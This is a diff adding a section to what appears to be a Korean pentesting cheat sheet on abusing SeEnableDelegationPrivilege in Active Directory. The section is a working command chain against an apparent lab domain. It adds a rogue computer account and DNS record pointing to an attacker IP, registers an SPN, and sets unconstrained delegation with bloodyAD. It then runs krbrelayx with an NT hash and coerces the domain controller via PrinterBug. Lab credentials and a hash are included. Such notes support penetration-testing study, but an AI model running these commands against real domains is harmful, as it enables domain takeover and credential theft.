@@ -1595,3 +1595,29 @@ DCSync 공격으로 모든 해시 덤프
 
   
 </details>
+
+---
+<details>
+  <summary><strong>SeEnableDelegationPrivilege</strong></summary>
+
+- 서명 강제가 아닐 경우 릴레잉 가능
+```bash
+netexec ldap dc1.delegate.vl -u A.Briggs -p P4ssw0rd1#123 -M maq
+
+addcomputer.py -computer-name oxdf -computer-pass 0xdf0xdf. -dc-ip 10.129.56.255 delegate.vl/N.Thompson:'KALEB_2341'
+
+python3 /opt/krbrelayx/dnstool.py -u 'delegate.vl\oxdf$' -p '0xdf0xdf.' --action add --record oxdf.delegate.vl --data 10.10.14.35 --type A -dns-ip 10.129.56.255 dc1.delegate.vl
+
+python3 /opt/krbrelayx/addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/oxdf.delegate.vl' -t 'oxdf$' -dc-ip 10.129.56.255 dc1.delegate.vl
+
+bloodyAD -d delegate.vl -u N.Thompson -p KALEB_2341 --host dc1.delegate.vl add uac 'oxdf$' -f TRUSTED_FOR_DELEGATION
+
+python3 /opt/krbrelayx/krbrelayx.py -hashes :02cb8258df07966e32677128e5ff1d26
+```
+```bash
+netexec smb dc1.delegate.vl -u 'oxdf$' -p 0xdf0xdf. -M coerce_plus
+
+netexec smb dc1.delegate.vl -u 'oxdf$' -p 0xdf0xdf. -M coerce_plus -o LISTENER=oxdf.delegate.vl METHOD=PrinterBug
+```
+
+</details>
